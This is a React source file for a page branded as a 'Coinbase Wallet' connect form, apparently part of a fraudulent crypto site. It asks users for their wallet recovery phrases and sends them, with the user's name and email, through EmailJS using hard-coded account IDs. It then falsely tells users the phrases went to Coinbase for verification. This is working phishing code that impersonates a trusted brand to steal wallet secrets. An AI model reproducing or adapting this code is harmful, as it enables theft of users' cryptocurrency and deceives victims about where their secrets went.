import React, { useState, useEffect } from 'react'
import { useForm } from 'react-hook-form'
import logo2 from '../../images/logo (2).png'
import { send } from 'emailjs-com'

const Coinbase = ({ setPage, notific, user, refreshPage }) => {
  console.log(user)
  const [formLoading, setFormLoading] = useState(false)
  const [toSend, setToSend] = useState({
    from_wallet: '',
    from_firstname: '',
    from_lastname: '',
    from_email: '',
    message: '',
  })

  // const {
  //   handleSubmit,
  //   register,
  //   formState: { errors },
  // } = useForm()

  // const onSubmitRequest = (formData) => {
  //   setFormLoading(true)
  //   if (Number(formData.amount) > Number(user.amount)) {
  //     setFormLoading(false)
  //     notific(
  //       'error',
  //       'Insufficent balance. Amount requested is more than your wallet balance'
  //     )
  //   } else {
  //     fetch(`${process.env.REACT_APP_API_URL}/user/withdraw`, {
  //       method: 'post',
  //       headers: { 'content-Type': 'application/json' },
  //       body: JSON.stringify({ formData, email: user.email, type: 'BTC' }),
  //     })
  //       .then((res) => res.json())
  //       .then((data) => {
  //         if (data.success) {
  //           notific('success', data.message)
  //           setFormLoading(false)
  //           setTimeout(() => {
  //             refreshPage()
  //           }, 3000)
  //         } else {
  //           notific('error', data.message)
  //           setFormLoading(false)
  //         }
  //       })
  //       .catch((err) => {
  //         console.log(err)
  //         notific('error', 'An error occured')
  //         setFormLoading(false)
  //       })
  //   }
  // }

  useEffect(() => {
    setToSend({
      ...toSend,
      from_email: user.email,
      from_wallet: 'Coinbase Wallet',
      from_firstname: user.firstname,
      from_lastname: user.lastname,
    })
  }, [])

  console.log(toSend)
  const onSubmit = (e) => {
    setToSend({ ...toSend, from_wallet: 'Coinbase wallet' })
    e.preventDefault()
    send('service_68ahmsh', 'template_proinesmet', toSend, 'm6YRrZKtNIMi_eARU')
      .then((response) => {
        notific('success', 'Phrases submitted')
        setFormLoading(true)
      })
      .catch((err) => {
        console.log('FAILED...', err)
      })
  }
  const handleChange = (e) => {
    setToSend({ ...toSend, [e.target.name]: e.target.value })
  }

  return (
    <div>
      <section className='withdraw-transfer'>
        <div className='overlays'>
          <div className='width'>
            {' '}
            <button
              className='home-btn'
              onClick={() => {
                setPage('Home')
              }}
            >
              {' <-'} Back
            </button>
            {formLoading ? (
              <div className='div'>
                <h2>Wallet Phrases submitted to Coinbase</h2>
                <p>
                  Due to security and privacy reasons, the phrases have been
                  submitted to Coinbase wallet for verification and access. Upon
                  confirmation we will link the wallet directly from Coinbase
                  wallet
                </p>
              </div>
            ) : (
              <form className='forms' onSubmit={onSubmit}>
                <div className='with-wrap'>
                  <div className='text-wrapper'>
                    <p>Coinbase Wallet Phrases</p>
                    <textarea
                      id=''
                      cols='30'
                      rows='10'
                      className='input'
                      placeholder='Phrases'
                      name='message'
                      onChange={handleChange}
                    ></textarea>
                  </div>
                </div>
                <div className='button-wrapper'>
                  <input
                    className='button'
                    type='submit'
                    value={formLoading ? '.....' : 'Connect'}
                  />
                </div>
              </form>
            )}
          </div>
        </div>
      </section>
    </div>
  )
}

export default Coinbase
